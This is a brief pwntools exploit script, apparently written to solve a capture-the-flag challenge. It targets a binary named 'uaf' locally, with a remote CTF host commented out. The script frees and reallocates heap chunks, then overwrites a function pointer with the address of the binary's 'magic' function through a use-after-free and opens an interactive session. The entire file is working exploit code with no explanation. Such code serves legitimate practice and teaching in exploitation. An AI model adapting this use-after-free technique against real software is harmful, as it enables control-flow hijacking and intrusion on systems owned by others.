from pwn import *
#r=remote("ctf.j0n9hyun.xyz",3020)
r=process("./uaf")
b=ELF("./uaf")

r.sendline('1')
r.sendline('100')
r.sendline('hello')
r.sendline('1')
r.sendline('100')
r.sendline('hello')
r.sendline('2')
r.sendline('0')
r.sendline('1')
r.sendline('120')

pay=''
pay+='x'*0x70
pay+=p32(b.symbols['magic'])

r.sendline(pay)
r.sendline(pay)
r.sendline('1')
r.interactive()
